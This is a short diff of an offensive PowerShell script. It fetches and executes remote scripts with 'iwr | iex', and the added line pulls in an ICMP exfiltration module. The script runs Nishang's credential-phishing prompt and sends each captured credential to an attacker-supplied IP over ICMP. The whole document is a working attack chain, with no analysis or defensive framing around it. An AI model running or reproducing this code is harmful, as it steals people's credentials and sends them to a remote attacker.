@@ -8,5 +8,7 @@ Param($ip,$port)
 } -ArgumentList $ip, $port
 
 iwr https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-CredentialsPhish.ps1 | iex
+iwr https://raw.githubusercontent.com/aptmasterclass/powershell-kungfu/master/exfil/Invoke-ICMPExfil.ps1 | iex
+
 Invoke-CredentialsPhish | % { $p = $_; 1..10 | % { Invoke-ICMPExfil -Target $ip -Payload $p -Verbose } }
 
